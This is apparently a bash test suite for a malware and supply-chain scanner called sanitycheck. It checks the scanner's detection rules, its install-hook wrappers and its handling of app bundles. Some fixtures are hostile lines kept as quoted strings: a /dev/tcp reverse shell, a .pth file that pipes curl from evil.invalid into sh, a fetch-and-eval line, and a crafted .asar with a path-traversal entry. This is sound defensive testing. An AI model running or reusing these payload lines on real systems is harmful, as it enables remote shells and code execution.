#!/usr/bin/env bash
# sanitycheck test suite. Unit-tests pure functions (sourced individually, the
# main script is not run) plus integration tests over inert fixtures. Offline and
# deterministic: no network, no LLM, fixtures never execute (dangerous lines are
# quoted strings or behind SystemExit guards).
# MODE and ASAR_PASS are read by the functions sourced below, not by this file.
# shellcheck disable=SC2034
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SC="$HERE/sanitycheck.sh"
FIX="$HERE/tests"
if [[ -t 1 ]]; then G=$'\033[32m' R=$'\033[31m' Z=$'\033[0m'; else G='' R='' Z=''; fi
fails=0
pass() { printf '  %sPASS%s  %s\n' "$G" "$Z" "$1"; }
fail() { printf '  %sFAIL%s  %s\n' "$R" "$Z" "$1"; fails=$((fails+1)); }
eq()   { [[ "$2" == "$3" ]] && pass "$1" || fail "$1 (want '$3' got '$2')"; }

# --- unit: source individual functions without running main -------------------
eval "$(sed -n '/^extract_url()/,/^}/p'         "$SC")"
eval "$(sed -n '/^classify_input()/,/^}/p'      "$SC")"
eval "$(sed -n '/^sev_rank()/,/^}/p'            "$SC")"
eval "$(sed -n '/^more_severe()/,/^}/p'         "$SC")"
eval "$(sed -n '/^CONTEXT_TAGS=/,/^is_context_tag()/p'  "$SC")"
eval "$(sed -n '/^is_vendored_path()/,/^}/p'            "$SC")"
eval "$(sed -n '/^demote_for_mode()/,/^}/p' "$SC")"
eval "$(sed -n '/^parse_llm()/,/^}/p' "$SC")"

echo "unit: parse_llm (LLM response parsing)"
parse_llm 'sure: {"verdict":"dangerous","summary":"drops a RAT","warnings":["revshell"]} done'
eq "verdict parsed" "$LLM_VERDICT" "DANGEROUS"
eq "summary parsed" "$LLM_SUMMARY" "drops a RAT"

eval "$(sed -n '/^extract_fetch_urls()/,/^}/p' "$SC")"
echo "unit: extract_fetch_urls (staged-download URL extraction)"
utf=$(mktemp)
printf 'curl -fsSL https://a.example/s2.sh -o /tmp/x\nwget http://b.example/p.bin\necho see https://not-fetched.example/docs\n' > "$utf"
uurls="$(extract_fetch_urls "$utf")"
[[ "$uurls" == *"https://a.example/s2.sh"* ]] && pass "extracts curl download URL" || fail "curl url"
[[ "$uurls" == *"http://b.example/p.bin"* ]] && pass "extracts wget download URL" || fail "wget url"
[[ "$uurls" != *"not-fetched"* ]] && pass "ignores non-download URL" || fail "over-extracts"
rm -f "$utf"

echo "unit: classify_input"
eq "dir -> repo"                "$(classify_input "$FIX/benign-poc")" "repo"
eq ".py file -> file"           "$(classify_input "$FIX/caution-poc/poc.py")" "file"
eq "curl|bash cmd -> installer" "$(classify_input 'curl -fsSL https://x.io/i.sh | bash')" "installer"
eq "script URL -> installer"    "$(classify_input 'https://x.io/install.sh')" "installer"
eq "git URL -> repo"            "$(classify_input 'https://github.com/u/repo.git')" "repo"
eq "github repo URL -> repo"    "$(classify_input 'https://github.com/u/repo')" "repo"
eq "raw .sh URL -> installer"   "$(classify_input 'https://raw.githubusercontent.com/u/r/main/install.sh')" "installer"

echo "unit: extract_url"
eq "url from curl cmd" "$(extract_url 'curl -fsSL https://x.io/i.sh | bash')" "https://x.io/i.sh"

echo "unit: more_severe"
eq "DANGEROUS beats CAUTION" "$(more_severe CAUTION DANGEROUS)" "DANGEROUS"
eq "CAUTION beats SAFE"      "$(more_severe SAFE CAUTION)" "CAUTION"

echo "unit: demote_for_mode (anti-cry-wolf)"
ASAR_PASS=0
MODE=installer
eq "persistence demoted to LOW"   "$(demote_for_mode persistence MED)" "LOW"
eq "download-exec HIGH -> MED"    "$(demote_for_mode download-exec HIGH)" "MED"
eq "reverse-shell stays HIGH"     "$(demote_for_mode reverse-shell HIGH)" "HIGH"
MODE=repo
eq "no demotion in repo mode"     "$(demote_for_mode persistence MED)" "MED"
MODE=pkgcheck
eq "pkgcheck demotes native-vendored"  "$(demote_for_mode native-vendored HIGH)" "LOW"
eq "pkgcheck keeps install-hook"       "$(demote_for_mode install-hook HIGH)" "HIGH"
MODE=repo
# inside a built app bundle: install-time and credential-path tags are noise,
# runtime-behaviour tags are not
ASAR_PASS=1
eq "asar demotes secret-scrape"        "$(demote_for_mode secret-scrape MED)" "LOW"
eq "asar demotes install-hook"         "$(demote_for_mode install-hook HIGH)" "LOW"
eq "asar keeps reverse-shell"          "$(demote_for_mode reverse-shell HIGH)" "HIGH"
eq "asar demotes import-shadow"        "$(demote_for_mode import-shadow CRIT)" "LOW"
ASAR_PASS=0
# ...but in a source tree, which is what the clone and pip hooks actually scan,
# a compiled module beside a same-named .py stays the ChocoPoC signal
eq "source tree keeps import-shadow"   "$(demote_for_mode import-shadow CRIT)" "CRIT"

# Installed code is scanned, not skipped - only weighted differently. A dual-use
# pattern in someone else's dependency says nothing about this project; an
# unambiguous one still does, because a trojanned dependency is the main threat.
echo "unit: is_vendored_path / context tags"
VENDOR_DIRS=(env)
for p in /r/node_modules/x/i.js /r/env/lib/python3.10/site-packages/u/c.py /r/build/lib/t.py; do
  is_vendored_path "$p" && pass "vendored: $p" || fail "not detected as vendored: $p"
done
for p in /r/src/main.py /r/vendor/skytext/gradient.py; do
  is_vendored_path "$p" && fail "wrongly vendored: $p" || pass "author's code: $p"
done
is_context_tag sni-front     && pass "sni-front is context"      || fail "sni-front should be context"
is_context_tag reverse-shell && fail "reverse-shell must not be" || pass "reverse-shell keeps severity"
is_context_tag ioc-str       && fail "ioc-str must not be"       || pass "ioc-str keeps severity"
is_context_tag js-fetch-exec && fail "js-fetch-exec must not be" || pass "js-fetch-exec keeps severity"
# regression: as a multi-line string, tags at end-of-line were followed by a
# newline and never matched, silently disabling demotion for five of them
ctbad=0
for ct in "${CONTEXT_TAGS[@]}"; do is_context_tag "$ct" || ctbad=$((ctbad+1)); done
eq "every context tag actually matches" "$ctbad" "0"
VENDOR_DIRS=()

# --- integration: fixtures (offline, no LLM) ---------------------------------
scan() { # dir [flags...]
  local dir="$1"; shift
  local json; json="$("$SC" --offline "$@" --json "$FIX/$dir" 2>/dev/null)"
  "$SC" --offline "$@" "$FIX/$dir" >/dev/null 2>&1; EXIT=$?
  VERDICT="$(printf '%s' "$json" | python3 -c 'import json,sys;print(json.load(sys.stdin)["verdict"])' 2>/dev/null)"
  TAGS=" $(printf '%s' "$json" | python3 -c 'import json,sys;print(" ".join(sorted({f["tag"] for f in json.load(sys.stdin)["findings"]})))' 2>/dev/null) "
}
has() { [[ "$TAGS" == *" $1 "* ]] && pass "detects $1" || fail "missing tag $1"; }

echo "integration: benign-poc -> SAFE"
scan benign-poc;   eq "verdict" "$VERDICT" "SAFE"; eq "exit" "$EXIT" "0"

echo "integration: benign-npm -> not DANGEROUS (legit node-gyp postinstall = MED, not a dropper)"
scan benign-npm
[[ "$VERDICT" != "DANGEROUS" ]] && pass "benign npm is not DANGEROUS ($VERDICT)" || fail "benign npm FP: DANGEROUS"
expect_no_tag() { [[ "$TAGS" != *" $1 "* ]] && pass "no $1" || fail "unexpected $1"; }
expect_no_tag npm-script-exec

echo "integration: chocopoc-lookalike -> DANGEROUS"
scan chocopoc-lookalike; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
for t in import-shadow ioc-pkg ioc-str native-load env-gating pth-exec harvest sni-front doh; do has "$t"; done

echo "integration: generic-malware -> DANGEROUS"
scan generic-malware; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
for t in reverse-shell download-exec destructive win-lolbin exfil-channel; do has "$t"; done

echo "integration: deep-triggers -> DANGEROUS (Python deep-pass)"
scan deep-triggers; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
for t in typosquat ast-install-exec ast-decode-exec entropy-blob; do has "$t"; done

echo "integration: dev-targeting -> DANGEROUS (editor/IDE/CI autorun + Trojan Source)"
scan dev-targeting; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
for t in ide-autorun direnv conftest-exec py-startup-exec npm-install-script npm-script-exec trojan-source; do has "$t"; done

echo "integration: evasion -> DANGEROUS (obfuscation/normalization variants still caught)"
scan evasion; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
for t in reverse-shell ioc-pkg typosquat import-shadow trojan-source win-lolbin; do has "$t"; done

echo "hook: git/pip/npm wrappers"
htmp=$(mktemp -d); fbin=$(mktemp -d); wrapd=$(mktemp -d)
# offline wrapper so the hook scans stay fast/deterministic in the test (real
# hooks run with network resolve on)
printf '#!/bin/sh\nexec "%s" --offline "$@"\n' "$SC" > "$wrapd/sc"; chmod +x "$wrapd/sc"
cp "$FIX/dev-targeting/package.json" "$htmp/package.json"   # known-DANGEROUS npm project
printf '#!/bin/sh\necho REAL_RAN\n' > "$fbin/npm"; cp "$fbin/npm" "$fbin/pip3"; chmod +x "$fbin/npm" "$fbin/pip3"
henv=(SANITYCHECK_BIN="$wrapd/sc" SANITYCHECK_HOOK=1 SANITYCHECK_HOOK_STRICT=1)
nout=$(cd "$htmp" && PATH="$fbin:$PATH" env "${henv[@]}" bash -c "source '$HERE/hooks/sanitycheck.zsh'; npm install 2>&1" </dev/null)
[[ "$nout" == *"npm install aborted"* && "$nout" != *REAL_RAN* ]] && pass "npm install aborts + blocks real npm" || fail "npm wrapper"
pout=$(PATH="$fbin:$PATH" env "${henv[@]}" bash -c "source '$HERE/hooks/sanitycheck.zsh'; pip3 install '$FIX/chocopoc-lookalike' 2>&1" </dev/null)
[[ "$pout" == *"install aborted"* && "$pout" != *REAL_RAN* ]] && pass "pip3 install aborts + blocks real pip" || fail "pip wrapper"
gsrc=$(mktemp -d); gdstp=$(mktemp -d); cp -R "$FIX/chocopoc-lookalike/." "$gsrc/"
( cd "$gsrc" && git init -q && git add -A && git -c commit.gpgsign=false \
    -c user.email=a@b -c user.name=a commit -qm x --no-verify ) >/dev/null 2>&1
gout=$(env SANITYCHECK_BIN="$wrapd/sc" SANITYCHECK_HOOK=1 bash -c "source '$HERE/hooks/sanitycheck.zsh'; git clone -q '$gsrc' '$gdstp/c' 2>&1" </dev/null)
# no tty on stdin -> the hook must scan automatically, without a [Y/n] prompt
[[ "$gout" == *DANGEROUS* && "$gout" != *"[Y/n]"* ]] && pass "git clone scans the checkout" || fail "git clone wrapper"
rm -rf "$htmp" "$fbin" "$wrapd" "$gsrc" "$gdstp"

echo "hook: install trigger routing (which subcommands scan, and with what args)"
# A stub sanitycheck that just prints how it was invoked, plus stub managers, so
# we can assert each wrapper routes the right subcommands to a scan with the
# right ecosystem/target/package args. Non-interactive (stdin closed) -> the
# [Y/n] prompt auto-proceeds, so this exercises routing without a pty.
trh=$(mktemp -d)
printf '#!/bin/sh\nprintf "SCAN %%s\\n" "$*"\n' >"$trh/sc"; chmod +x "$trh/sc"
for m in npm yarn pnpm poetry uv pip pip3 pipx; do printf '#!/bin/sh\necho REAL\n' >"$trh/$m"; chmod +x "$trh/$m"; done
mkdir -p "$trh/proj"; printf '{"name":"p"}\n' >"$trh/proj/package.json"; printf 'requests\n' >"$trh/proj/requirements.txt"
route() { # expected-substring-or-'PASS'  command...
  local want="$1"; shift
  local got; got=$(cd "$trh/proj" && SANITYCHECK_BIN="$trh/sc" SANITYCHECK_HOOK=1 PATH="$trh:$PATH" \
    bash -c "source '$HERE/hooks/sanitycheck.zsh'; $*" </dev/null 2>&1)
  local scan; scan=$(printf '%s' "$got" | sed -n 's/^SCAN //p')
  if [[ "$want" == PASSTHROUGH ]]; then
    [[ -z "$scan" ]] && pass "no scan: $*" || fail "unexpected scan for '$*' -> $scan"
  else
    [[ "$scan" == *"$want"* ]] && pass "routes '$*' -> $want" || fail "'$*' routed to '$scan' (want *$want*)"
  fi
}
route "--ecosystem npm leftpad"   npm install leftpad
route "--ecosystem npm leftpad"   npm i leftpad
route "."                          npm ci
route "--ecosystem npm leftpad"   npm add leftpad
route PASSTHROUGH                  npm run build
route "--ecosystem npm leftpad"   yarn add leftpad
route "--ecosystem npm leftpad"   pnpm add leftpad
route "--ecosystem pypi requests" pip install requests
route "."                          pip install -r requirements.txt
route "."                          pip install .
route PASSTHROUGH                  pip download requests
route PASSTHROUGH                  pip list
route "--ecosystem pypi black"    pipx install black
route "--ecosystem pypi httpie"   pipx run httpie
route PASSTHROUGH                  pipx list
route "--ecosystem pypi evil"     poetry add evil
route "."                          poetry install
route "--ecosystem pypi x"        uv add x
route "."                          uv sync
route "--ecosystem pypi x y"      uv pip install x y      # the "pip" token is skipped
route "."                          uv pip install -r requirements.txt
route PASSTHROUGH                  uv run script
rm -rf "$trh"

if command -v zsh >/dev/null 2>&1; then
  echo "hook: curl|bash matcher (zsh POSIX-ERE)"
  zmatch() { CMD="$1" zsh -c "source '$HERE/hooks/sanitycheck.zsh'; _sanitycheck_match \"\$CMD\""; }
  zmatch 'curl -fsSL https://x.io/i.sh | bash' && pass "matches curl|bash" || fail "curl|bash not matched"
  zmatch 'wget -qO- https://x.io/i.sh | sudo sh' && pass "matches wget|sudo sh" || fail "wget|sudo sh not matched"
  zmatch 'bash <(curl -fsSL https://x.io/i.sh)' && pass "matches bash <(curl)" || fail "process-sub not matched"
  zmatch 'curl -fsSL https://x.io/f.tgz -o f.tgz' && fail "false-matched a plain curl download" || pass "ignores plain curl download"
else
  echo "hook: (zsh unavailable — skipping curl|bash matcher test)"
fi

echo "check-pkg: named-install name vetting (offline name match, no dir scan)"
"$SC" --offline --check-pkg frint >/dev/null 2>&1; eq "known-malicious name -> exit 1" "$?" "1"
"$SC" --offline --check-pkg lodash requests >/dev/null 2>&1; eq "clean names -> exit 0" "$?" "0"
cpo="$("$SC" --offline --check-pkg lodash 2>&1)"; [[ -z "$cpo" ]] && pass "clean name is silent when piped (auto scan)" || fail "clean name printed output when piped"
# ...but interactive (stdout is a tty) prints a one-line SAFE confirmation
if command -v script >/dev/null 2>&1; then
  cptty=$(mktemp)
  if script --version >/dev/null 2>&1; then script -qec "'$SC' --offline --check-pkg lodash" "$cptty" >/dev/null 2>&1
  else script -q "$cptty" "$SC" --offline --check-pkg lodash >/dev/null 2>&1; fi
  grep -q "lodash — SAFE" "$cptty" && pass "clean name prints SAFE confirmation on a tty" || fail "no SAFE confirmation on tty"
  rm -f "$cptty"
fi
"$SC" --offline --check-pkg sky-text >/dev/null 2>&1; eq "separator variant (sky-text) -> exit 1" "$?" "1"
"$SC" --offline --check-pkg --ecosystem npm skytext >/dev/null 2>&1; eq "npm ecosystem name match -> exit 1" "$?" "1"
"$SC" --offline --check-pkg --ecosystem npm express >/dev/null 2>&1; eq "npm clean name -> exit 0" "$?" "0"

echo "integration: installer mode (loopback-served fixtures, TP/TN)"
if command -v curl >/dev/null 2>&1 && command -v python3 >/dev/null 2>&1; then
  isrv=$(mktemp); python3 -c '
import http.server, socketserver, sys, os
os.chdir(sys.argv[1])
with socketserver.TCPServer(("127.0.0.1", 0), http.server.SimpleHTTPRequestHandler) as h:
    print(h.server_address[1], flush=True); h.serve_forever()
' "$FIX/installers" >"$isrv" 2>/dev/null &
  ISRV=$!
  for _ in 1 2 3 4 5 6 7 8 9 10; do [[ -s "$isrv" ]] && break; sleep 0.2; done
  IPORT="$(head -1 "$isrv")"
  if [[ -n "$IPORT" ]]; then
    "$SC" --offline "curl -fsSL http://127.0.0.1:$IPORT/benign.sh | bash" >/dev/null 2>&1
    eq "benign installer -> exit 0 (not DANGEROUS)" "$?" "0"
    ij="$("$SC" --offline --json "curl -fsSL http://127.0.0.1:$IPORT/malicious.sh | bash" 2>/dev/null)"
    "$SC" --offline "curl -fsSL http://127.0.0.1:$IPORT/malicious.sh | bash" >/dev/null 2>&1
    eq "malicious installer -> exit 1" "$?" "1"
    iv="$(printf '%s' "$ij" | python3 -c 'import json,sys;print(json.load(sys.stdin)["verdict"])' 2>/dev/null)"
    eq "malicious installer verdict" "$iv" "DANGEROUS"
    it=" $(printf '%s' "$ij" | python3 -c 'import json,sys;print(" ".join(sorted({f["tag"] for f in json.load(sys.stdin)["findings"]})))' 2>/dev/null) "
    [[ "$it" == *" ioc-str "* ]] && pass "installer IOC C2 host caught (CRIT survives demotion)" || fail "installer ioc-str missing"
    [[ "$it" == *" reverse-shell "* ]] && pass "installer reverse-shell caught (HIGH survives demotion)" || fail "installer reverse-shell missing"
  else
    fail "installer test: loopback server did not start"
  fi
  kill "$ISRV" 2>/dev/null; wait "$ISRV" 2>/dev/null; rm -f "$isrv"
else
  echo "  (curl or python3 unavailable — skipping installer mode test)"
fi

# The default report is the tl;dr: repeats collapse, LOW and LLM notes stay
# behind -v. --json is unaffected and still carries every finding.
# Stock .pth files carry an import line and sit in every virtualenv, so they are
# whitelisted by content. Whitelisting by name alone would hand an attacker a
# filename that disables the check.
# A prebuilt app is scored differently from source: the capabilities a real
# application plausibly has drop to LOW, so the verdict means something. The risk
# of that policy is going blind, so both halves are asserted.
echo "app bundle: benign capabilities quiet, hostile ones still caught"
atmp=$(mktemp -d); mkdir -p "$atmp/T.app/Contents/Resources"
printf '<plist/>\n' > "$atmp/T.app/Contents/Info.plist"
# things a real app does: read the keychain, git-push, JIT, capture the screen
printf 'inert\nvar a="security find-generic-password -s x";\nvar b="https://api.github.com/user/repos";\nvar c="mss()";\nvar d="~/.aws/credentials";\n' \
  > "$atmp/T.app/Contents/Resources/app.js"
av="$("$SC" --offline --json "$atmp/T.app" 2>/dev/null | python3 -c 'import json,sys;print(json.load(sys.stdin)["verdict"])')"
eq "app capabilities alone -> SAFE" "$av" "SAFE"
printf 'inert\nvar e="bash -i >& /dev/tcp/1.2.3.4/9001 0>&1";\n' > "$atmp/T.app/Contents/Resources/x.js"
at="$("$SC" --offline --json "$atmp/T.app" 2>/dev/null | python3 -c '
import json,sys
d=json.load(sys.stdin)
hi=sorted({f["tag"] for f in d["findings"] if f["severity"] in ("CRIT","HIGH")})
print(d["verdict"], " ".join(hi))')"
# one HIGH is CAUTION by design; two independent ones make DANGEROUS. What
# matters here is that the bundle policy did not swallow the tag.
[[ "$at" != SAFE* && "$at" == *reverse-shell* ]] \
  && pass "hostile pattern in a bundle still surfaces at HIGH" \
  || fail "app-bundle policy went blind: $at"
rm -rf "$atmp"

echo "pth: stock virtualenv shims are quiet, impostors are not"
ptmp=$(mktemp -d)
printf "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim();\n" \
  > "$ptmp/distutils-precedence.pth"
pv="$("$SC" --offline --json "$ptmp" 2>/dev/null | python3 -c 'import json,sys;print(json.load(sys.stdin)["verdict"])')"
eq "stock setuptools .pth -> SAFE" "$pv" "SAFE"
printf "import os; os.system('curl http://evil.invalid|sh')\n" > "$ptmp/distutils-precedence.pth"
pi="$("$SC" --offline --json "$ptmp" 2>/dev/null | python3 -c 'import json,sys;print(" ".join(f["tag"] for f in json.load(sys.stdin)["findings"]))')"
[[ "$pi" == *"pth-exec"* ]] && pass "impostor under the same name still CRIT" || fail "name-based whitelist bypass"
rm -rf "$ptmp"

echo "report: repeated findings collapse by default, expand under -v"
rtmp=$(mktemp -d); mkdir -p "$rtmp/libs"
for lib in a b c d; do printf 'inert\n' > "$rtmp/libs/lib$lib.dylib"; done
# captured, not piped: `grep -q` exits at the first match, which SIGPIPEs the
# scanner and trips pipefail into reporting a failure that never happened
rout="$("$SC" --offline "$rtmp" 2>/dev/null)"
routv="$("$SC" --offline -v "$rtmp" 2>/dev/null)"
rc="$(printf '%s\n' "$rout"  | grep -c 'native-vendored')"
rv="$(printf '%s\n' "$routv" | grep -c 'native-vendored')"
eq "4 identical findings print once" "$rc" "1"
eq "-v prints all 4"                 "$rv" "4"
[[ "$rout" == *"(+3 more files)"* ]] \
  && pass "collapsed line names the file count" || fail "no file count on collapsed line"
rj="$("$SC" --offline --json "$rtmp" 2>/dev/null | python3 -c 'import json,sys;print(len(json.load(sys.stdin)["findings"]))')"
eq "--json keeps all 4" "$rj" "4"
rm -rf "$rtmp"

echo "report: SAFE omits the findings-count line; non-SAFE includes it"
rs="$("$SC" --offline "$FIX/benign-poc" 2>/dev/null)"
[[ "$rs" == *"VERDICT: SAFE"* && "$rs" != *"findings:"* ]] && pass "SAFE report has no findings: line" || fail "SAFE report shape"
rd="$("$SC" --offline "$FIX/chocopoc-lookalike" 2>/dev/null)"
[[ "$rd" == *"findings:"* && "$rd" == *"VERDICT: DANGEROUS"* ]] && pass "DANGEROUS report has findings: line" || fail "DANGEROUS report shape"

# Regression for the git-clone-scan-death bug: with the progress spinner active
# (needs a tty) a scan longer than one spinner sweep used to die under set -e
# before printing its verdict. Drive a real scan through a pty and require the
# verdict to appear. SANITYCHECK_SPIN_INTERVAL speeds the sweep so it is crossed
# deterministically on a fast fixture scan.
echo "regression: long scan under active spinner still prints verdict (#spinner-set-e)"
if command -v script >/dev/null 2>&1; then
  ptylog=$(mktemp)
  if script --version >/dev/null 2>&1; then          # util-linux
    SANITYCHECK_SPIN_INTERVAL=0.001 script -qec "'$SC' --offline '$FIX/chocopoc-lookalike'" "$ptylog" >/dev/null 2>&1
  else                                                # BSD/macOS
    SANITYCHECK_SPIN_INTERVAL=0.001 script -q "$ptylog" "$SC" --offline "$FIX/chocopoc-lookalike" >/dev/null 2>&1
  fi
  grep -q "VERDICT: DANGEROUS" "$ptylog" && pass "verdict printed with spinner active" || fail "spinner death: no verdict under pty"
  grep -q "auditing" "$ptylog" && pass "spinner actually ran" || fail "spinner never rendered (test not exercising the path)"
  rm -f "$ptylog"
else
  echo "  (script unavailable — skipping spinner regression test)"
fi

echo "integration: malware-2026 -> DANGEROUS (current TTPs: fetch-exec, worm exfil, macOS fileless, AI-triage evasion)"
scan malware-2026; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
for t in js-fetch-exec multi-decode repo-exfil devtool-theft tunnel-c2 \
         macos-inmem gatekeeper llm-evasion ci-secret-exfil registry-redirect; do has "$t"; done

# Electron .asar: built at test time so the real parser is exercised, and so the
# repo carries no binary fixture. Also asserts the untrusted-input defences.
echo "integration: .asar unpacking (Electron app bundle)"
if command -v python3 >/dev/null 2>&1; then
  adir=$(mktemp -d); mkdir -p "$adir/T.app/Contents/Resources"
  python3 - "$adir/T.app/Contents/Resources/app.asar" <<'PYASAR'
import json, struct, sys
files = {
    # inert: the dangerous line is a string that is never evaluated
    "index.js": b"throw new Error('inert');\nvar x = \"eval(fetch('https://x.invalid/s').then(r=>r.text()))\";\n",
    "pkg/util.js": b"module.exports = 1;\n",
}
tree, data, off = {"files": {}}, b"", 0
for name, content in files.items():
    node, parts = tree, name.split("/")
    for p in parts[:-1]:
        node = node["files"].setdefault(p, {"files": {}})
    node["files"][parts[-1]] = {"size": len(content), "offset": str(off)}
    data += content; off += len(content)
# a traversal entry and a symlink entry, which the reader must refuse
tree["files"]["../../escaped.js"] = {"size": 5, "offset": str(off)}
tree["files"]["link.js"] = {"link": "index.js"}
data += b"BAD!\n"
js = json.dumps(tree).encode()
pad = (4 - len(js) % 4) % 4
payload = struct.pack("<I", len(js)) + js + b"\0" * pad
header = struct.pack("<I", len(payload)) + payload
open(sys.argv[1], "wb").write(struct.pack("<II", 4, len(header)) + header + data)
PYASAR
  aj="$("$SC" --offline --json "$adir/T.app" 2>/dev/null)"
  afiles="$(printf '%s' "$aj" | python3 -c 'import json,sys;print(" ".join(f["file"] for f in json.load(sys.stdin)["findings"]))' 2>/dev/null)"
  atags="$(printf '%s' "$aj" | python3 -c 'import json,sys;print(" ".join(sorted({f["tag"] for f in json.load(sys.stdin)["findings"]})))' 2>/dev/null)"
  [[ "$atags" == *"js-fetch-exec"* ]] && pass "scans code inside the .asar" || fail "asar contents not scanned (tags: $atags)"
  [[ "$afiles" == *"app.asar!/index.js"* ]] && pass "reports findings against the archive path" || fail "asar path label missing ($afiles)"
  [[ "$atags" != *"asar-unread"* ]] && pass "archive unpacked cleanly" || fail "asar reported unreadable"
  # nothing may be written outside the extraction dir, and no symlink created
  [[ ! -e "$adir/escaped.js" && ! -e "$adir/T.app/escaped.js" ]] \
    && pass "rejects ../ traversal entry" || fail "asar traversal escaped the extract dir"
  rm -rf "$adir"
else
  echo "  (python3 unavailable — skipping asar test)"
fi

# ripgrep is an optional accelerator, so the two backends must agree exactly -
# a scanner that finds different things depending on which binary happens to be
# installed is worse than a slow one. rg also skips hidden files and obeys
# .gitignore by default, which would silently drop dotfile findings; these
# fixtures contain .npmrc / .envrc / .pth, so they exercise that.
# A rule whose regex fails to compile returns no matches, and the engine call
# swallows stderr - so a broken rule is indistinguishable from a clean scan.
# Compile every rule against every available engine.
echo "rules: every pattern compiles on each search engine"
eval "$(sed -n '/^rule()/,/^}/p' "$SC")"
RULE_SEV=(); RULE_TAG=(); RULE_GLOB=(); RULE_ERE=(); RULE_MSG=()
SH='' ANY='' ANYPLUS='' JS=''   # globs are irrelevant to compiling the pattern
eval "$(sed -n '/^load_rules()/,/^}/p' "$SC")"; load_rules
for eng in grep rg; do
  command -v "$eng" >/dev/null 2>&1 || continue
  bad=0
  for ri in "${!RULE_ERE[@]}"; do
    if [[ "$eng" == grep ]]; then printf '' | grep -E -- "${RULE_ERE[$ri]}" >/dev/null 2>&1
    else printf '' | rg -e "${RULE_ERE[$ri]}" >/dev/null 2>&1; fi
    (( $? > 1 )) && { fail "rule '${RULE_TAG[$ri]}' does not compile under $eng"; bad=1; }
  done
  (( bad )) || pass "all ${#RULE_ERE[@]} rule patterns compile under $eng"
done

echo "engines: grep and ripgrep agree"
if command -v rg >/dev/null 2>&1; then
  edump() { # engine fixture
    SANITYCHECK_SEARCH="$1" "$SC" --offline --json "$FIX/$2" 2>/dev/null | python3 -c '
import json,sys
d=json.load(sys.stdin)
print(d["verdict"])
for f in sorted(d["findings"], key=lambda x:(x["tag"],x["file"],x["line"])):
    print(f["severity"], f["tag"], f["file"], f["line"])'
  }
  for efx in chocopoc-lookalike dev-targeting malware-2026; do
    if [[ "$(edump grep "$efx")" == "$(edump rg "$efx")" ]]; then
      pass "identical findings on $efx"
    else
      fail "grep/rg disagree on $efx"
    fi
  done
else
  echo "  (rg unavailable — skipping engine-parity test)"
fi

echo "integration: caution-poc -> CAUTION + --strict exit codes"
scan caution-poc; eq "verdict" "$VERDICT" "CAUTION"; eq "exit (default)" "$EXIT" "0"
scan caution-poc --strict; eq "exit (--strict)" "$EXIT" "1"

echo
if (( fails )); then printf '%sFAIL%s: %d check(s) failed\n' "$R" "$Z" "$fails"; exit 1; fi
printf '%sPASS%s: all checks passed\n' "$G" "$Z"
